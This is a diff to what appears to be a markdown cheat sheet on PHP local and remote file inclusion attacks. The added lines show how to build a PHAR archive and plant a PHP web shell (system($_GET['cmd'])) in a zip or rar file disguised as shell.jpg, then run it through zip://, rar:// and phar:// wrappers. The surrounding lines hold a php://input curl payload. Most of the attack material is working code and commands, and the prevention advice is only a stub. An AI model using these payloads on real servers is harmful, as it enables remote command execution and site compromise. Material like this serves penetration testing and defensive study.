@@ -124,7 +124,39 @@ NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
 curl -XPOST "http://localhost/LFI-RFI/Index.php?page=php://input" --data "<?php echo shell_exec('whoami'); ?>"
 ```
 ## ZIP / PHAR
-# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
+- PHAR archive structure:(*)
+PHAR files work like ZIP files, when you can use the phar:// to access files stored inside them.
+
+Create a phar archive containing a backdoor file: php --define phar.readonly=0 archive.php
+```
+<?php
+  $phar = new Phar('archive.phar');
+  $phar->startBuffering();
+  $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
+  $phar->setStub('<?php __HALT_COMPILER(); ?>');
+  $phar->stopBuffering();
+?>
+```
+- Upload a Zip or Rar file with a PHPShell inside and access it.
+In order to be able to abuse the rar protocol it need to be specifically activated.
+
+```
+echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
+zip payload.zip payload.php;
+mv payload.zip shell.jpg;
+rm payload.php
+
+http://example.com/index.php?page=zip://shell.jpg%23payload.php
+```
+- To compress with rar
+```
+rar a payload.rar payload.php;
+mv payload.rar shell.jpg;
+rm payload.php
+http://example.com/index.php?page=rar://shell.jpg%23payload.php
+Use the phar:// wrapper: curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt
+```
+ note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
 ## How to Prevent LFI and RFI Attacks?
 - Input Validation
 - Whitelist Approach
